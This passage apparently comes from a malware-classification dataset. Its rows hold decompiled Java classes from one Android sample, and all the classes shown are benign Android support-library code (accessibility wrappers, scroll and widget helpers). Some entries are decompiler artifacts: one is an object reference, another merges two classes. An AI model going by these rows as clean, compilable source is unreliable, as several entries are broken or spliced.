IMPL.getFromIndex(this.mRecord);   }   public void setFromIndex(  int fromIndex){     IMPL.setFromIndex(this.mRecord,fromIndex);   }   public int getToIndex(){     return IMPL.getToIndex(this.mRecord);   }   public void setToIndex(  int toIndex){     IMPL.setToIndex(this.mRecord,toIndex);   }   public int getScrollX(){     return IMPL.getScrollX(this.mRecord);   }   public void setScrollX(  int scrollX){     IMPL.setScrollX(this.mRecord,scrollX);   }   public int getScrollY(){     return IMPL.getScrollY(this.mRecord);   }   public void setScrollY(  int scrollY){     IMPL.setScrollY(this.mRecord,scrollY);   }   public int getMaxScrollX(){     return IMPL.getMaxScrollX(this.mRecord);   }   public void setMaxScrollX(  int maxScrollX){     IMPL.setMaxScrollX(this.mRecord,maxScrollX);   }   public int getMaxScrollY(){     return IMPL.getMaxScrollY(this.mRecord);   }   public void setMaxScrollY(  int maxScrollY){     IMPL.setMaxScrollY(this.mRecord,maxScrollY);   }   public int getAddedCount(){     return IMPL.getAddedCount(this.mRecord);   }   public void setAddedCount(  int addedCount){     IMPL.setAddedCount(this.mRecord,addedCount);   }   public int getRemovedCount(){     return IMPL.getRemovedCount(this.mRecord);   }   public void setRemovedCount(  int removedCount){     IMPL.setRemovedCount(this.mRecord,removedCount);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mRecord);   }   public void setClassName(  CharSequence className){     IMPL.setClassName(this.mRecord,className);   }   public List<CharSequence> getText(){     return IMPL.getText(this.mRecord);   }   public CharSequence getBeforeText(){     return IMPL.getBeforeText(this.mRecord);   }   public void setBeforeText(  CharSequence beforeText){     IMPL.setBeforeText(this.mRecord,beforeText);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mRecord);   }   public void setContentDescription(  CharSequence contentDescription){     IMPL.setContentDescription(this.mRecord,contentDescription);   }   public Parcelable getParcelableData(){     return IMPL.getParcelableData(this.mRecord);   }   public void setParcelableData(  Parcelable parcelableData){     IMPL.setParcelableData(this.mRecord,parcelableData);   }   public void recycle(){     IMPL.recycle(this.mRecord);   }   public int hashCode(){     if (this.mRecord == null) {       return 0;     }     return this.mRecord.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityRecordCompat other=(AccessibilityRecordCompat)obj;       return this.mRecord == null ? other.mRecord == null : this.mRecord.equals(other.mRecord);     }     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordCompatIcs.code","class AccessibilityRecordCompatIcs {   AccessibilityRecordCompatIcs(){   }   public static Object obtain(){     return AccessibilityRecord.obtain();   }   public static Object obtain(  Object record){     return AccessibilityRecord.obtain((AccessibilityRecord)record);   }   public static int getAddedCount(  Object record){     return ((AccessibilityRecord)record).getAddedCount();   }   public static CharSequence getBeforeText(  Object record){     return ((AccessibilityRecord)record).getBeforeText();   }   public static CharSequence getClassName(  Object record){     return ((AccessibilityRecord)record).getClassName();   }   public static CharSequence getContentDescription(  Object record){     return ((AccessibilityRecord)record).getContentDescription();   }   public static int getCurrentItemIndex(  Object record){     return ((AccessibilityRecord)record).getCurrentItemIndex();   }   public static int getFromIndex(  Object record){     return ((AccessibilityRecord)record).getFromIndex();   }   public static int getItemCount(  Object record){     return ((AccessibilityRecord)record).getItemCount();   }   public static Parcelable getParcelableData(  Object record){     return ((AccessibilityRecord)record).getParcelableData();   }   public static int getRemovedCount(  Object record){     return ((AccessibilityRecord)record).getRemovedCount();   }   public static int getScrollX(  Object record){     return ((AccessibilityRecord)record).getScrollX();   }   public static int getScrollY(  Object record){     return ((AccessibilityRecord)record).getScrollY();   }   public static Object getSource(  Object record){     return ((AccessibilityRecord)record).getSource();   }   public static List<CharSequence> getText(  Object record){     return ((AccessibilityRecord)record).getText();   }   public static int getToIndex(  Object record){     return ((AccessibilityRecord)record).getToIndex();   }   public static int getWindowId(  Object record){     return ((AccessibilityRecord)record).getWindowId();   }   public static boolean isChecked(  Object record){     return ((AccessibilityRecord)record).isChecked();   }   public static boolean isEnabled(  Object record){     return ((AccessibilityRecord)record).isEnabled();   }   public static boolean isFullScreen(  Object record){     return ((AccessibilityRecord)record).isFullScreen();   }   public static boolean isPassword(  Object record){     return ((AccessibilityRecord)record).isPassword();   }   public static boolean isScrollable(  Object record){     return ((AccessibilityRecord)record).isScrollable();   }   public static void recycle(  Object record){     ((AccessibilityRecord)record).recycle();   }   public static void setAddedCount(  Object record,  int addedCount){     ((AccessibilityRecord)record).setAddedCount(addedCount);   }   public static void setBeforeText(  Object record,  CharSequence beforeText){     ((AccessibilityRecord)record).setBeforeText(beforeText);   }   public static void setChecked(  Object record,  boolean isChecked){     ((AccessibilityRecord)record).setChecked(isChecked);   }   public static void setClassName(  Object record,  CharSequence className){     ((AccessibilityRecord)record).setClassName(className);   }   public static void setContentDescription(  Object record,  CharSequence contentDescription){     ((AccessibilityRecord)record).setContentDescription(contentDescription);   }   public static void setCurrentItemIndex(  Object record,  int currentItemIndex){     ((AccessibilityRecord)record).setCurrentItemIndex(currentItemIndex);   }   public static void setEnabled(  Object record,  boolean isEnabled){     ((AccessibilityRecord)record).setEnabled(isEnabled);   }   public static void setFromIndex(  Object record,  int fromIndex){     ((AccessibilityRecord)record).setFromIndex(fromIndex);   }   public static void setFullScreen(  Object record,  boolean isFullScreen){     ((AccessibilityRecord)record).setFullScreen(isFullScreen);   }   public static void setItemCount(  Object record,  int itemCount){     ((AccessibilityRecord)record).setItemCount(itemCount);   }   public static void setParcelableData(  Object record,  Parcelable parcelableData){     ((AccessibilityRecord)record).setParcelableData(parcelableData);   }   public static void setPassword(  Object record,  boolean isPassword){     ((AccessibilityRecord)record).setPassword(isPassword);   }   public static void setRemovedCount(  Object record,  int removedCount){     ((AccessibilityRecord)record).setRemovedCount(removedCount);   }   public static void setScrollX(  Object record,  int scrollX){     ((AccessibilityRecord)record).setScrollX(scrollX);   }   public static void setScrollY(  Object record,  int scrollY){     ((AccessibilityRecord)record).setScrollY(scrollY);   }   public static void setScrollable(  Object record,  boolean scrollable){     ((AccessibilityRecord)record).setScrollable(scrollable);   }   public static void setSource(  Object record,  View source){     ((AccessibilityRecord)record).setSource(source);   }   public static void setToIndex(  Object record,  int toIndex){     ((AccessibilityRecord)record).setToIndex(toIndex);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordCompatIcsMr1.code","class AccessibilityRecordCompatIcsMr1 {   AccessibilityRecordCompatIcsMr1(){   }   public static int getMaxScrollX(  Object record){     return ((AccessibilityRecord)record).getMaxScrollX();   }   public static int getMaxScrollY(  Object record){     return ((AccessibilityRecord)record).getMaxScrollY();   }   public static void setMaxScrollX(  Object record,  int maxScrollX){     ((AccessibilityRecord)record).setMaxScrollX(maxScrollX);   }   public static void setMaxScrollY(  Object record,  int maxScrollY){     ((AccessibilityRecord)record).setMaxScrollY(maxScrollY);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordCompatJellyBean.code","class AccessibilityRecordCompatJellyBean {   AccessibilityRecordCompatJellyBean(){   }   public static void setSource(  Object record,  View root,  int virtualDescendantId){     ((AccessibilityRecord)record).setSource(root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordIcsImpl.code","static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {   AccessibilityRecordIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityRecordCompatIcs.obtain();   }   @Override public Object obtain(  Object record){     return AccessibilityRecordCompatIcs.obtain(record);   }   @Override public int getAddedCount(  Object record){     return AccessibilityRecordCompatIcs.getAddedCount(record);   }   @Override public CharSequence getBeforeText(  Object record){     return AccessibilityRecordCompatIcs.getBeforeText(record);   }   @Override public CharSequence getClassName(  Object record){     return AccessibilityRecordCompatIcs.getClassName(record);   }   @Override public CharSequence getContentDescription(  Object record){     return AccessibilityRecordCompatIcs.getContentDescription(record);   }   @Override public int getCurrentItemIndex(  Object record){     return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);   }   @Override public int getFromIndex(  Object record){     return AccessibilityRecordCompatIcs.getFromIndex(record);   }   @Override public int getItemCount(  Object record){     return AccessibilityRecordCompatIcs.getItemCount(record);   }   @Override public Parcelable getParcelableData(  Object record){     return AccessibilityRecordCompatIcs.getParcelableData(record);   }   @Override public int getRemovedCount(  Object record){     return AccessibilityRecordCompatIcs.getRemovedCount(record);   }   @Override public int getScrollX(  Object record){     return AccessibilityRecordCompatIcs.getScrollX(record);   }   @Override public int getScrollY(  Object record){     return AccessibilityRecordCompatIcs.getScrollY(record);   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));   }   @Override public List<CharSequence> getText(  Object record){     return AccessibilityRecordCompatIcs.getText(record);   }   @Override public int getToIndex(  Object record){     return AccessibilityRecordCompatIcs.getToIndex(record);   }   @Override public int getWindowId(  Object record){     return AccessibilityRecordCompatIcs.getWindowId(record);   }   @Override public boolean isChecked(  Object record){     return AccessibilityRecordCompatIcs.isChecked(record);   }   @Override public boolean isEnabled(  Object record){     return AccessibilityRecordCompatIcs.isEnabled(record);   }   @Override public boolean isFullScreen(  Object record){     return AccessibilityRecordCompatIcs.isFullScreen(record);   }   @Override public boolean isPassword(  Object record){     return AccessibilityRecordCompatIcs.isPassword(record);   }   @Override public boolean isScrollable(  Object record){     return AccessibilityRecordCompatIcs.isScrollable(record);   }   @Override public void recycle(  Object record){     AccessibilityRecordCompatIcs.recycle(record);   }   @Override public void setAddedCount(  Object record,  int addedCount){     AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){     AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);   }   @Override public void setChecked(  Object record,  boolean isChecked){     AccessibilityRecordCompatIcs.setChecked(record,isChecked);   }   @Override public void setClassName(  Object record,  CharSequence className){     AccessibilityRecordCompatIcs.setClassName(record,className);   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){     AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){     AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);   }   @Override public void setEnabled(  Object record,  boolean isEnabled){     AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);   }   @Override public void setFromIndex(  Object record,  int fromIndex){     AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){     AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);   }   @Override public void setItemCount(  Object record,  int itemCount){     AccessibilityRecordCompatIcs.setItemCount(record,itemCount);   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){     AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);   }   @Override public void setPassword(  Object record,  boolean isPassword){     AccessibilityRecordCompatIcs.setPassword(record,isPassword);   }   @Override public void setRemovedCount(  Object record,  int removedCount){     AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);   }   @Override public void setScrollX(  Object record,  int scrollX){     AccessibilityRecordCompatIcs.setScrollX(record,scrollX);   }   @Override public void setScrollY(  Object record,  int scrollY){     AccessibilityRecordCompatIcs.setScrollY(record,scrollY);   }   @Override public void setScrollable(  Object record,  boolean scrollable){     AccessibilityRecordCompatIcs.setScrollable(record,scrollable);   }   @Override public void setSource(  Object record,  View source){     AccessibilityRecordCompatIcs.setSource(record,source);   }   @Override public void setToIndex(  Object record,  int toIndex){     AccessibilityRecordCompatIcs.setToIndex(record,toIndex);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordIcsMr1Impl.code","static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {   AccessibilityRecordIcsMr1Impl(){   }   @Override public int getMaxScrollX(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);   }   @Override public int getMaxScrollY(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){     AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){     AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordImpl.code","interface AccessibilityRecordImpl {   int getAddedCount(  Object obj);   CharSequence getBeforeText(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getCurrentItemIndex(  Object obj);   int getFromIndex(  Object obj);   int getItemCount(  Object obj);   int getMaxScrollX(  Object obj);   int getMaxScrollY(  Object obj);   Parcelable getParcelableData(  Object obj);   int getRemovedCount(  Object obj);   int getScrollX(  Object obj);   int getScrollY(  Object obj);   AccessibilityNodeInfoCompat getSource(  Object obj);   List<CharSequence> getText(  Object obj);   int getToIndex(  Object obj);   int getWindowId(  Object obj);   boolean isChecked(  Object obj);   boolean isEnabled(  Object obj);   boolean isFullScreen(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   Object obtain();   Object obtain(  Object obj);   void recycle(  Object obj);   void setAddedCount(  Object obj,  int i);   void setBeforeText(  Object obj,  CharSequence charSequence);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setCurrentItemIndex(  Object obj,  int i);   void setEnabled(  Object obj,  boolean z);   void setFromIndex(  Object obj,  int i);   void setFullScreen(  Object obj,  boolean z);   void setItemCount(  Object obj,  int i);   void setMaxScrollX(  Object obj,  int i);   void setMaxScrollY(  Object obj,  int i);   void setParcelableData(  Object obj,  Parcelable parcelable);   void setPassword(  Object obj,  boolean z);   void setRemovedCount(  Object obj,  int i);   void setScrollX(  Object obj,  int i);   void setScrollY(  Object obj,  int i);   void setScrollable(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setToIndex(  Object obj,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordJellyBeanImpl.code","static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {   AccessibilityRecordJellyBeanImpl(){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){     AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordStubImpl.code","static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {   AccessibilityRecordStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  Object record){     return null;   }   @Override public int getAddedCount(  Object record){     return 0;   }   @Override public CharSequence getBeforeText(  Object record){     return null;   }   @Override public CharSequence getClassName(  Object record){     return null;   }   @Override public CharSequence getContentDescription(  Object record){     return null;   }   @Override public int getCurrentItemIndex(  Object record){     return 0;   }   @Override public int getFromIndex(  Object record){     return 0;   }   @Override public int getItemCount(  Object record){     return 0;   }   @Override public int getMaxScrollX(  Object record){     return 0;   }   @Override public int getMaxScrollY(  Object record){     return 0;   }   @Override public Parcelable getParcelableData(  Object record){     return null;   }   @Override public int getRemovedCount(  Object record){     return 0;   }   @Override public int getScrollX(  Object record){     return 0;   }   @Override public int getScrollY(  Object record){     return 0;   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return null;   }   @Override public List<CharSequence> getText(  Object record){     return Collections.emptyList();   }   @Override public int getToIndex(  Object record){     return 0;   }   @Override public int getWindowId(  Object record){     return 0;   }   @Override public boolean isChecked(  Object record){     return false;   }   @Override public boolean isEnabled(  Object record){     return false;   }   @Override public boolean isFullScreen(  Object record){     return false;   }   @Override public boolean isPassword(  Object record){     return false;   }   @Override public boolean isScrollable(  Object record){     return false;   }   @Override public void recycle(  Object record){   }   @Override public void setAddedCount(  Object record,  int addedCount){   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){   }   @Override public void setChecked(  Object record,  boolean isChecked){   }   @Override public void setClassName(  Object record,  CharSequence className){   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){   }   @Override public void setEnabled(  Object record,  boolean isEnabled){   }   @Override public void setFromIndex(  Object record,  int fromIndex){   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){   }   @Override public void setItemCount(  Object record,  int itemCount){   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){   }   @Override public void setPassword(  Object record,  boolean isPassword){   }   @Override public void setRemovedCount(  Object record,  int removedCount){   }   @Override public void setScrollX(  Object record,  int scrollX){   }   @Override public void setScrollY(  Object record,  int scrollY){   }   @Override public void setScrollable(  Object record,  boolean scrollable){   }   @Override public void setSource(  Object record,  View source){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){   }   @Override public void setToIndex(  Object record,  int toIndex){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityStateChangeListenerBridge.code","interface AccessibilityStateChangeListenerBridge {   void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityStateChangeListenerCompat.code","public static abstract class AccessibilityStateChangeListenerCompat {   final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);   public abstract void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\AccessibilityDelegate.code","class AccessibilityDelegate extends AccessibilityDelegateCompat {   private final Rect mTmpRect=new Rect();   AccessibilityDelegate(){   }   @Override public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     AccessibilityNodeInfoCompat superNode=AccessibilityNodeInfoCompat.obtain(info);     super.onInitializeAccessibilityNodeInfo(host,superNode);     info.setSource(host);     Object parentForAccessibility=ViewCompat.getParentForAccessibility(host);     if (parentForAccessibility instanceof View) {       info.setParent((View)parentForAccessibility);     }     copyNodeInfoNoChildren(info,superNode);     superNode.recycle();     addChildrenForAccessibility(info,(ViewGroup)host);   }   private void addChildrenForAccessibility(  AccessibilityNodeInfoCompat info,  ViewGroup v){     int childCount=v.getChildCount();     for (int i=0; i < childCount; i++) {       View child=v.getChildAt(i);       if (!filter(child)) {         int importance=ViewCompat.getImportantForAccessibility(child); switch (importance) { case 0:           ViewCompat.setImportantForAccessibility(child,1);         break; case 2:       if (child instanceof ViewGroup) {         addChildrenForAccessibility(info,(ViewGroup)child);         break;       }  else {         continue;       }   }   info.addChild(child); } } } @Override public boolean onRequestSendAccessibilityEvent(ViewGroup host,View child,AccessibilityEvent event){ if (filter(child)) { return false; } return super.onRequestSendAccessibilityEvent(host,child,event); } public boolean filter(View child){ View openDrawer=DrawerLayout.this.findOpenDrawer(); return (openDrawer == null || openDrawer == child) ? false : true; } private void copyNodeInfoNoChildren(AccessibilityNodeInfoCompat dest,AccessibilityNodeInfoCompat src){ Rect rect=this.mTmpRect; src.getBoundsInParent(rect); dest.setBoundsInParent(rect); src.getBoundsInScreen(rect); dest.setBoundsInScreen(rect); dest.setVisibleToUser(src.isVisibleToUser()); dest.setPackageName(src.getPackageName()); dest.setClassName(src.getClassName()); dest.setContentDescription(src.getContentDescription()); dest.setEnabled(src.isEnabled()); dest.setClickable(src.isClickable()); dest.setFocusable(src.isFocusable()); dest.setFocused(src.isFocused()); dest.setAccessibilityFocused(src.isAccessibilityFocused()); dest.setSelected(src.isSelected()); dest.setLongClickable(src.isLongClickable()); dest.addAction(src.getActions()); } } class AccessibilityDelegate extends AccessibilityDelegateCompat {   private final Rect mTmpRect=new Rect();   AccessibilityDelegate(){   }   @Override public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     AccessibilityNodeInfoCompat superNode=AccessibilityNodeInfoCompat.obtain(info);     super.onInitializeAccessibilityNodeInfo(host,superNode);     copyNodeInfoNoChildren(info,superNode);     superNode.recycle();     info.setClassName(SlidingPaneLayout.class.getName());     info.setSource(host);     Object parentForAccessibility=ViewCompat.getParentForAccessibility(host);     if (parentForAccessibility instanceof View) {       info.setParent((View)parentForAccessibility);     }     int childCount=SlidingPaneLayout.this.getChildCount();     for (int i=0; i < childCount; i++) {       View child=SlidingPaneLayout.this.getChildAt(i);       if (!filter(child) && child.getVisibility() == 0) {         ViewCompat.setImportantForAccessibility(child,1);         info.addChild(child);       }     }   }   @Override public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     super.onInitializeAccessibilityEvent(host,event);     event.setClassName(SlidingPaneLayout.class.getName());   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     if (filter(child)) {       return false;     }     return super.onRequestSendAccessibilityEvent(host,child,event);   }   public boolean filter(  View child){     return SlidingPaneLayout.this.isDimmed(child);   }   private void copyNodeInfoNoChildren(  AccessibilityNodeInfoCompat dest,  AccessibilityNodeInfoCompat src){     Rect rect=this.mTmpRect;     src.getBoundsInParent(rect);     dest.setBoundsInParent(rect);     src.getBoundsInScreen(rect);     dest.setBoundsInScreen(rect);     dest.setVisibleToUser(src.isVisibleToUser());     dest.setPackageName(src.getPackageName());     dest.setClassName(src.getClassName());     dest.setContentDescription(src.getContentDescription());     dest.setEnabled(src.isEnabled());     dest.setClickable(src.isClickable());     dest.setFocusable(src.isFocusable());     dest.setFocused(src.isFocused());     dest.setAccessibilityFocused(src.isAccessibilityFocused());     dest.setSelected(src.isSelected());     dest.setLongClickable(src.isLongClickable());     dest.addAction(src.getActions());     dest.setMovementGranularities(src.getMovementGranularities());   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\AutoScrollHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@fc07e2"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\BaseEdgeEffectImpl.code","static class BaseEdgeEffectImpl implements EdgeEffectImpl {   BaseEdgeEffectImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return null;   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){   }   @Override public boolean isFinished(  Object edgeEffect){     return true;   }   @Override public void finish(  Object edgeEffect){   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return false;   }   @Override public boolean onRelease(  Object edgeEffect){     return false;   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return false;   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\BaseListPopupWindowImpl.code","static class BaseListPopupWindowImpl implements ListPopupWindowImpl {   BaseListPopupWindowImpl(){   }   @Override public View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\BasePopupMenuImpl.code","static class BasePopupMenuImpl implements PopupMenuImpl {   BasePopupMenuImpl(){   }   @Override public View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\Callback.code","public static abstract class Callback {   public abstract boolean tryCaptureView(  View view,  int i);   public void onViewDragStateChanged(  int state){   }   public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){   }   public void onViewCaptured(  View capturedChild,  int activePointerId){   }   public void onViewReleased(  View releasedChild,  float xvel,  float yvel){   }   public void onEdgeTouched(  int edgeFlags,  int pointerId){   }   public boolean onEdgeLock(  int edgeFlags){     return false;   }   public void onEdgeDragStarted(  int edgeFlags,  int pointerId){   }   public int getOrderedChildIndex(  int index){     return index;   }   public int getViewHorizontalDragRange(  View child){     return 0;   }   public int getViewVerticalDragRange(  View child){     return 0;   }   public int clampViewPositionHorizontal(  View child,  int left,  int dx){     return 0;   }   public int clampViewPositionVertical(  View child,  int top,  int dy){     return 0;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ChangeObserver.code","public class ChangeObserver extends ContentObserver {   public ChangeObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     CursorAdapter.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ClampedScroller.code","public static class ClampedScroller {   private int mEffectiveRampDown;   private int mRampDownDuration;   private int mRampUpDuration;   private float mStopValue;   private float mTargetVelocityX;   private float mTargetVelocityY;   private long mStartTime=Long.MIN_VALUE;   private long mStopTime=-1;   private long mDeltaTime=0;   private int mDeltaX=0;   private int mDeltaY=0;   public void setRampUpDuration(  int durationMillis){     this.mRampUpDuration=durationMillis;   }   public void setRampDownDuration(  int durationMillis){     this.mRampDownDuration=durationMillis;   }   public void start(){     this.mStartTime=AnimationUtils.currentAnimationTimeMillis();     this.mStopTime=-1L;     this.mDeltaTime=this.mStartTime;     this.mStopValue=0.5f;     this.mDeltaX=0;     this.mDeltaY=0;   }   public void requestStop(){     long currentTime=AnimationUtils.currentAnimationTimeMillis();     this.mEffectiveRampDown=AutoScrollHelper.constrain((int)(currentTime - this.mStartTime),0,this.mRampDownDuration);     this.mStopValue=getValueAt(currentTime);     this.mStopTime=currentTime;   }   public boolean isFinished(){     return this.mStopTime > 0 && AnimationUtils.currentAnimationTimeMillis() > this.mStopTime + ((long)this.mEffectiveRampDown);   }   private float getValueAt(  long currentTime){     if (currentTime < this.mStartTime) {       return 0.0f;     }     if (this.mStopTime < 0 || currentTime < this.mStopTime) {       long elapsedSinceStart=currentTime - this.mStartTime;       return AutoScrollHelper.constrain(((float)elapsedSinceStart) / this.mRampUpDuration,0.0f,AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY) * 0.5f;     }     long elapsedSinceEnd=currentTime - this.mStopTime;     return (AutoScrollHelper.constrain(((float)elapsedSinceEnd) / this.mEffectiveRampDown,0.0f,AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY) * this.mStopValue) + (AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY - this.mStopValue);   }   private float interpolateValue(  float value){     return ((-4.0f) * value * value) + (4.0f * value);   }   public void computeScrollDelta(){     if (this.mDeltaTime == 0) {       throw new RuntimeException(""Cannot compute scroll delta before calling start()"");     }     long currentTime=AnimationUtils.currentAnimationTimeMillis();     float value=getValueAt(currentTime);     float scale=interpolateValue(value);     long elapsedSinceDelta=currentTime - this.mDeltaTime;     this.mDeltaTime=currentTime;     this.mDeltaX=(int)(((float)elapsedSinceDelta) * scale * this.mTargetVelocityX);     this.mDeltaY=(int)(((float)elapsedSinceDelta) * scale * this.mTargetVelocityY);   }   public void setTargetVelocity(  float x,  float y){     this.mTargetVelocityX=x;     this.mTargetVelocityY=y;   }   public int getHorizontalDirection(){     return (int)(this.mTargetVelocityX / Math.abs(this.mTargetVelocityX));   }   public int getVerticalDirection(){     return (int)(this.mTargetVelocityY / Math.abs(this.mTargetVelocityY));   }   public int getDeltaX(){     return this.mDeltaX;   }   public int getDeltaY(){     return this.mDeltaY;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ContentLoadingProgressBar.code","public class ContentLoadingProgressBar extends ProgressBar {   private static final int MIN_DELAY=500;   private static final int MIN_SHOW_TIME=500;   private final Runnable mDelayedHide;   private final Runnable mDelayedShow;   private boolean mDismissed;   private boolean mPostedHide;   private boolean mPostedShow;   private long mStartTime;   public ContentLoadingProgressBar(  Context context){     this(context,null);   }   public ContentLoadingProgressBar(  Context context,  AttributeSet attrs){     super(context,attrs,0);     this.mStartTime=-1L;     this.mPostedHide=false;     this.mPostedShow=false;     this.mDismissed=false;     this.mDelayedHide=new Runnable(){       @Override public void run(){         ContentLoadingProgressBar.this.mPostedHide=false;         ContentLoadingProgressBar.this.mStartTime=-1L;         ContentLoadingProgressBar.this.setVisibility(8);       }     } ;     this.mDelayedShow=new Runnable(){       @Override public void run(){         